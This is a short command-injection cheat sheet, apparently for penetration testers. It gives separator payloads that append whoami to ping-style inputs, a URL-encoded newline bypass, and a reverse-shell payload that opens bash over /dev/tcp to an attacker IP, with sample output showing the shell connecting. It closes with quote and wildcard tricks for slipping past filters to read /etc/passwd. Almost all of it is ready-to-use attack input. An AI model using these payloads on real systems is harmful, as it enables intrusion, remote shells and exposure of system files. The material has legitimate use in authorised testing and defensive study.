# COMMAND INJECTION

### Basic command injection

Try all separators in every input — Ping fields, search boxes, etc

```bash
127.0.0.1; whoami
127.0.0.1 | whoami
127.0.0.1 && whoami
127.0.0.1 || whoami
`whoami`
$(whoami)
```

<details>
<summary>Example Output</summary>

```
Input: 127.0.0.1; whoami

PING 127.0.0.1: 64 bytes from 127.0.0.1
www-data
(Command injection CONFIRMED)
```
</details>

---

### Newline injection

URL encoded newline — Bypass some filters

```bash
127.0.0.1%0awhoami
```

<details>
<summary>Example Output</summary>

```
Input: 127.0.0.1%0awhoami

PING 127.0.0.1: 64 bytes...
www-data
(%0a = newline, starts new command)
```
</details>

---

### Reverse shell from injection

Get a shell — URL encode special chars

```bash
127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```

<details>
<summary>Example Output</summary>

```
Input: ;bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'

Attacker nc -nlvp 443:
connect to [10.10.14.2] from [10.10.10.5]
bash-4.4$ whoami
www-data
```
</details>

---

### Bypass filters

Quote insertion, wildcards — When basic commands are blocked

```bash
w'h'oami
wh$@oami
/bin/w?oami
cat /et?/pas?wd
```

<details>
<summary>Example Output</summary>

```
whoami blocked? Try:
w'h'oami -> www-data
/bin/w?oami -> www-data
who$@ami -> www-data
cat /etc/passwd blocked? Try:
cat /et?/pas?wd -> works
tac /etc/passwd -> works (reverse cat)
```
</details>

---
